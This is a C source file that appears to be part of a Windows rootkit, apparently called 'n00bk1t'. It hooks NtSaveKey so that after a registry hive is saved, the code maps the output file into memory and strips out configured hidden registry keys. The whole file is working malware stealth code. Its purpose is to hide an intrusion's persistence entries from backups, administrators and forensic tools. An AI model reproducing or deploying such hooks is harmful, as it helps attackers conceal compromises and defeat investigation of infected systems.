#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"
#include "regraw.h"

#include "ntsavekey.h"

static int n00bk1t_name_test(const void *data,int length)
{
	if (config_CheckString(ConfigHiddenRegKey,(char*)data,length))
		return 0;

	return -1;
}

NTSTATUS CensorRegHiveInMemory(PVOID data)
{
	CleanRegistryFile(data,n00bk1t_name_test);
	return STATUS_SUCCESS;
}

NTSTATUS CensorRegHive(HANDLE hFile)
{
	OBJECT_ATTRIBUTES oaObjectAttributes={sizeof oaObjectAttributes,0,NULL,0};
	PVOID pViewBase=NULL;
	ULONG ulViewSize=0;
	HANDLE hSection;
	NTSTATUS rc;

	rc=NtCreateSection(&hSection,SECTION_ALL_ACCESS,&oaObjectAttributes,0,PAGE_READWRITE,SEC_COMMIT,hFile);
	if (!NT_SUCCESS(rc))
		 return rc;

	rc=NtMapViewOfSection(hSection,NtCurrentProcess(),&pViewBase,0,0,
		NULL,&ulViewSize,ViewUnmap,0,PAGE_READWRITE);
	if (!NT_SUCCESS(rc))
	{
		NtClose(hSection);
		return rc;
	}

	CensorRegHiveInMemory(pViewBase);
  
	rc=NtUnmapViewOfSection(NtCurrentProcess(),pViewBase);
	if (!NT_SUCCESS(rc))
	{
		NtClose(hSection);
		return rc;
	}

	NtClose(hSection);

	return STATUS_SUCCESS;
}

// ntdll.NtSafeKey
NTSTATUS WINAPI NewNtSaveKey(
  HANDLE    KeyHandle,
  HANDLE FileHandle 
)
{
	NTSTATUS rc;

	// call original function
	rc=OldNtSaveKey(KeyHandle,FileHandle);
	if (NT_SUCCESS(rc))
		CensorRegHive(FileHandle);

	return rc;
}
